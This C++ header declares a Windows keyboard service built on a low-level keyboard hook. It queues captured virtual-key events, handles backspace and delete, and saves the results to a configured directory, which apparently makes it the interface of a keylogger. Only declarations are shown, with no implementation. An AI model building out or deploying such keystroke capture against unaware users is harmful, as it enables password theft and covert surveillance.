#pragma once
#include "tools.hpp"
#include "io.hpp"
#include "winfx.hpp"
#include <thread>
#include <list>
#include <queue>
#include <string>
#include <sstream>
#include <fstream>

namespace services
{
	namespace keyboard
	{
		typedef struct
		{
			DWORD vkCode;
			WORD lang;
			WORD flags;
		} VirtualKeyInfo;
		typedef std::list<VirtualKeyInfo> VirtualKeyInfoList;
		typedef std::queue<VirtualKeyInfo> VirtualKeyInfoQueue;

		static std::thread vkQueueThread;

		static bool isRunning = false;
		const char dir[] = KBD_DIR;

		static size_t vkEvents;
		static size_t vkRepeats;
		static size_t vkListCursorBegin;
		static size_t vkListCursor;
		static VirtualKeyInfoList vkList;
		static VirtualKeyInfoQueue vkQueue;
		static VirtualKeyInfo lastKeyPressed;

		static HHOOK hhkLowLevelKybd = NULL;

		LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);

		void run();
		void stop();
		void save();
		void processqueue();
		void processvk(VirtualKeyInfo vkInfo);
		void onDelete();
		void onBackspace();
		void clear();

		inline bool isprintable(DWORD vkCode);
		inline bool vkcmp(VirtualKeyInfo vk1, VirtualKeyInfo vk2);
	}
}